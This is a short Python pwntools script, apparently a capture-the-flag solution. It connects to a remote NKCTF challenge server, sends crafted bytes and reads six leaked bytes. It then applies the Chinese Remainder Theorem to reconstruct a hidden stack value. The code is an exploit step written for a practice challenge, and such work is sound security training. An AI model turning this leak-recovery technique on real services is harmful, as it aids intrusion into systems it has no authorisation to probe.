from pwn import*
from pwn import*
context.update(arch='amd64',os='linux')
context.terminal = ['qterminal','-e']
context.log_level = 'debug'
from functools import reduce
from gmpy2 import gcd
from Crypto.Util.number import *




def egcd(a, b):
    """
    求解最大公约数及扩展欧几里得算法
    """
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
    return (g, x - (b // a) * y, y)


def china(num):
    """
    中国剩余定理求解
    """
    m1, a1, lcm = m[0], a[0], m[0]  # 初始化第一个模数、模余、最小公倍数
    for i in range(1, num):
        m2 = m[i]
        a2 = a[i]
        c = a2 - a1
        g, k1, k2 = egcd(m1, m2)
        lcm = lcm * m[i] // gcd(lcm, m[i])  # 更新最小公倍数
        if c % g:
            print("No Answer!")  # 如果模余之差不能被最大公约数整除，则无解
            return 0
        x0 = c // g * k1
        t = m2 // g
        x0 = (x0 % t + t) % t
        a1 += m1 * x0
        m1 = m2 // g * m1
    return a1


# 计算指定数量的解
def calculate_solutions(Num, _len):
    ans = china(Num)  # 求解中国剩余定理

    if ans % m[0] == a[0]:
        print(f"最小解: {hex(ans)}")

    solutions = []  # 存储解的列表
    i = 0
    x = ans + i * gbs
    while len(solutions) < _len:
        if x % m[0] == a[0]:  # 检查是否满足模余条件
            solutions.append(hex(x))
            print(f"解{i + 1}: {hex(x)}")
        i += 1
        x = ans + i * gbs
    return solutions



m = [0x7f,0x7e,0x7d,0x7c,0x7b,0x80] 
gbs = reduce(lambda x, y: x * y // gcd(x, y), m)    # 计算模数的最小公倍数
p = reduce(lambda x, y: x * y, m)                   # 计算所有模数的乘积


#a,b,c
#p=process('./leak')
p=remote('node.nkctf.yuzhian.com.cn' ,31913)
#gdb.attach(p,'b *$rebase(0x1169)')
p.sendline(b'\x7f\x7e\x7d\x7c\x7b\x7a')
# pause()

p.recvuntil('secret\n')
# '''
decimal_num1= int.from_bytes(p.recv(1), byteorder='big')
decimal_num2= int.from_bytes(p.recv(1), byteorder='big')
decimal_num3= int.from_bytes(p.recv(1), byteorder='big')
decimal_num4= int.from_bytes(p.recv(1), byteorder='big')
decimal_num5= int.from_bytes(p.recv(1), byteorder='big')
decimal_num6= int.from_bytes(p.recv(1), byteorder='big')
stack=int.from_bytes(p.recv(1), byteorder='big')      
log.info("num1 = %#x" % (decimal_num1))
log.info("num2 = %#x" % (decimal_num2))
log.info("num3 = %#x" % (decimal_num3))
log.info("num4 = %#x" % (decimal_num4))
log.info("num5 = %#x" % (decimal_num5))
log.info("num6 = %#x" % (decimal_num6))
# '''

log.info("sp = %#x" % (stack))

a = [decimal_num1, decimal_num2, decimal_num3,decimal_num4, decimal_num5, decimal_num6]
print(calculate_solutions(6, 5))

